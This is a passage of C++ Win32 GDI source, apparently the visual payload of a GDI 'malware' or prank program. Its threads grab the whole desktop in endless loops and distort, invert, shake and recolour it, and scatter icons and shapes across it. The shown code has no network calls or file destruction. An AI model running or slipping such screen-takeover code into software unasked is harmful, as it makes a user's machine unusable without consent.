	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x | y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

struct Point3D {
	float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y) {
	HINSTANCE hLib = LoadLibraryW(L"imageres.dll");
	HICON hIcon = LoadIcon(hLib, MAKEINTRESOURCE(rand() % 358));
	DrawIcon(hdc, x, y, hIcon);
	DeleteObject(hIcon);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y; point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x; point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x; point.y = y;
	return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawEllipseAt(hdc, screenX, screenY);
	}
	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI cube(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int wdpi = GetDeviceCaps(hdc, 88);
	int hdpi = GetDeviceCaps(hdc, 90);
	ReleaseDC(0, hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int x = w * wdpi / 96;
	int y = h * hdpi / 96;
	int sx = 1, sy = 1;
	int incrementor = 10;
	float x2 = 100.0, y2 = 100.0;
	float ax = 0.0, ay = 0.0, az = 0.0;
	float angleIncrement = 0.04;
	float colorA = 0;
	float size = 100;
	while (true) {
		hdc = GetDC(0);
		x2 += incrementor * sx;
		y2 += incrementor * sy;
		if (x2 + 75 >= x) {
			sx = -1; x2 = x - 76;
		}
		else if (x2 <= 75) {
			sx = 1; x2 = 76;
		}
		if (y2 + 75 >= y) {
			sy = -1; y2 = y - 76;
		}
		else if (y2 <= 75) {
			sy = 1; y2 = 76;
		}
		Point3D center = { x2, y2, 0.0f };
		HPEN hPen = CreatePen(0, 1, RGB(255, 255, 255));
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, ax, ay, az, colorA);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		DeleteDC(hdc);
		ax += angleIncrement;
		ay += angleIncrement;
		az += angleIncrement;
		Sleep(10);
		colorA += 1;
		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}
	return 0;
}

DWORD WINAPI shader16(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0)
				v = rand() % 2;
			*((BYTE*)data + 4 * i + v) += *((BYTE*)(data + i + v));
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader17(LPVOID lpParam) {
	int size = 450, xxx = 0, rop = NULL;
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = (i * i * 2) % w, y = (i | i * 2) ^ w;
			rgbScreen[i].rgb ^= (x * y) & (i + w + h) * i;
		}
		rop = SRCCOPY;
		int luckynum = rand() % 5;
		if (luckynum == 2) { rop = SRCAND; }
		else if (luckynum == 4) { rop = SRCPAINT; }
		BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, rop);
		for (int i = 0; i < 10; i++) {
			int x = -size + rand() % (w + size);
			int y = -size + rand() % (h + size);
			BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCAND);
		}
		for (int i = 0; i < 10; i++) {
			int x = -size + rand() % (w + size);
			int y = -size + rand() % (h + size);
			BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCPAINT);
		}
		for (int y = 0; y < h; y++) {
			int wow = (double)y / 20.0 * (double)xxx;
			int x = (int)(cos(wow) * 40.0);
			BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
		}
		for (int kun = 0; kun < 4; kun++) {
			int rw = rand() % w, rh = rand() % h;
			int tw = 0 + rw, th = 0 + rh;
			int bw = 100 + rw, bh = 100 + rh;
			int z = (rand() % 3);
			if (z == 0) {
				HRGN circle = CreateEllipticRgn(tw, th, bw, bh);
				InvertRgn(hdc, circle);
				DeleteObject(circle);
			}
			else if (z == 1) {
				HRGN square = CreateRectRgn(tw, th, bw, bh);
				InvertRgn(hdc, square);
				DeleteObject(square);
			}
			else if (z == 2) {
				POINT vpt[3] = { {0, 0}, {0, 0}, {0, 0} };
				vpt[0] = { tw, bh };
				vpt[1] = { bw, bh };
				vpt[2] = { (tw + bw) / 2, th };
				HRGN triangle = CreatePolygonRgn(vpt, 3, WINDING);
				InvertRgn(hdc, triangle);
				DeleteObject(triangle);
			};
		}
		BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		xxx++;
	}
}

VOID WINAPI train(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
	if (xPower >= w) xPower = w - 1;
	if (yPower >= h) yPower = h - 1;
	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, hbit);
	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
	BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
	BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
	DeleteDC(hdc2);
	DeleteObject(hbit);
}

DWORD WINAPI shake(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		for (int angle = 0; angle < 361; angle++) {
			int x = 100 * sin(angle * M_PI / 180.F);
			int y = 100 * cos(angle * M_PI / 180.F);
			train(hdc, w, h, x, y, SRCERASE);
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI ballz(LPVOID lpParam) {
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		HBRUSH hbsh = CreateSolidBrush(Hue(3));
		SelectObject(hdc, hbsh);
		Ellipse(hdc, x, y, x + 100, y + 100);
		if (y >= GetSystemMetrics(1)) {
			sy = -2;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -2;
		}
		if (y == 0) {
			sy = 3;
		}
		if (x == 0) {
			sx = 2;
		}
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader18(LPVOID lpParam) { //credits to pankoza, but i modified it
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int cx = x - (w / 2), cy = y + (h / 2);
			int zx = (cx * cx), zy = (cy * cy);
			int di = 128.0 - i;
			int fx = di + (di * sin(sqrt(zx + zy) / 32.0));
			rgbScreen[i].r -= 15;
			rgbScreen[i].g = fx;
			rgbScreen[i].b -= 45;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI icons(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader19(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				double fractalX = (2.5f / w);
				double fractalY = (1.90f / h);
				double cx = x * fractalX - 2.f;
				double cy = y * fractalY - 0.95f;
				double zx = 0, zy = 0;
				int fx = 0;
				while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
					double fczx = zx * zx - zy * zy + cx;
					double fczy = 2 * zx * zy + cy;
					zx = fczx; zy = fczy;
					fx++;
					rgbquad[index].rgbRed -= fx;
					rgbquad[index].rgbGreen -= fx;
					rgbquad[index].rgbBlue -= fx;
				}
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader20(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt(RGB(y, x, y)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI piez(LPVOID lpParam) { //credits to Executioner0x00
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH hbsh = CreateSolidBrush(Hue(3));
		SelectObject(hdc, hbsh);
		POINT cpt;
		GetCursorPos(&cpt);
		Pie(hdc, cpt.x + 50, cpt.y + 50, cpt.x - 50, cpt.y - 50, 30, 30, rand() % w, rand() % h);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader21(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y | x;
			data[i].rgb = (t & data[i].rgb % RGB(255, 255, 255) ^ x | y);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI plgblt(LPVOID lpParam) {
	RECT rect; POINT lpt[3];
	while (true) {
		HDC hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		lpt[0].x = rect.left + 6; lpt[0].y = rect.top - 6;
		lpt[1].x = rect.right + 6; lpt[1].y = rect.top + 6;
		lpt[2].x = rect.left - 6; lpt[2].y = rect.bottom + 6;
		PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right + rect.left, rect.bottom + rect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader22(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt((x & y) + x));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader23(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x | y) & i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader24(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh;
			rgbtriple[i].rgbtRed += x | y;
			rgbtriple[i].rgbtGreen += x | y;
			rgbtriple[i].rgbtBlue += x | y;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}

DWORD WINAPI scroll(LPVOID lpParam) {
	int y = 0;
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hbsh);
		SelectObject(mdc, hbsh);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h - y, mdc, 0, y, 0x1900AC010E);
		BitBlt(hdc, 0, h - y, w, y, mdc, 0, 0, 0x1900AC010E);
		y = y + 1;
		if (h <= y) { y = 0; }
		DeleteObject(hbsh); DeleteObject(mdc); DeleteObject(hbit);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shell32(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HINSTANCE lib = LoadLibraryA("shell32.dll");
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(lib, MAKEINTRESOURCE(rand() % 2048)), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader25(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int a = x * x - i, b = y * y - i;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt(a + i & b + i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI plgblt1(LPVOID lpParam) {
	RECT rect; POINT lpt[3];
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		GetWindowRect(GetDesktopWindow(), &rect);
		BLENDFUNCTION ftn = { AC_SRC_OVER, 0, 100, 0 };
		lpt[0].x = rand() % w; lpt[0].y = rand() % h;
		lpt[1].x = rand() % w; lpt[1].y = rand() % h;
		lpt[2].x = rand() % w; lpt[2].y = rand() % h;
		PlgBlt(mdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, NULL, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, ftn);
		ReleaseDC(0, hdc);
		DeleteDC(mdc); DeleteObject(bmp);
	}
}

DWORD WINAPI triangles(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		TRIVERTEX vtx[3];
		vtx[0].x = rand() % w; vtx[0].y = rand() % h;
		vtx[1].x = rand() % w; vtx[1].y = rand() % h;
		vtx[2].x = rand() % w; vtx[2].y = rand() % h;
		vtx[0].Red = 0xbf00; vtx[0].Green = 0xff00; vtx[0].Blue = 0x0000; vtx[0].Alpha = 0x0000;
		vtx[1].Red = 0xf000; vtx[1].Green = 0xb000; vtx[1].Blue = 0x9000; vtx[1].Alpha = 0x0000;
		vtx[2].Red = 0xfb00; vtx[2].Green = 0xb800; vtx[2].Blue = 0x0000; vtx[2].Alpha = 0x0000;
		GRADIENT_TRIANGLE gt;
		gt.Vertex1 = 0;  gt.Vertex2 = 1; gt.Vertex3 = 2;
		GradientFill(hdc, vtx, 4, &gt, 1, GRADIENT_FILL_TRIANGLE);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI stretch(LPVOID lpParam) {
	double angle = 0.0;
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int xadd = (int)(cos(angle) * 50.0);
		int yadd = (int)(tan(angle) * 50.0);
		SetStretchBltMode(hdc, 3);
		StretchBlt(hdc, xadd / 2, yadd / 2, w - xadd, h - yadd, hdc, 0, 0, w, h, NOTSRCERASE);
		angle = angle + 0.1963495408493621;
		DeleteObject(hdc);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader26(LPVOID lpParam) {
	int xxx = 0;
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h;
			rgbScreen[i].r = ((i * x) & (i | x) - w * xxx * 4) / 256;
			rgbScreen[i].g = -((i * x) | (i ^ y) - w * xxx * 4) / 256;
			rgbScreen[i].b = ((i * x) ^ (i | x) - w * xxx * 4) / 256;
		}
		xxx++;
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
	return 0;
}

DWORD WINAPI shader27(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
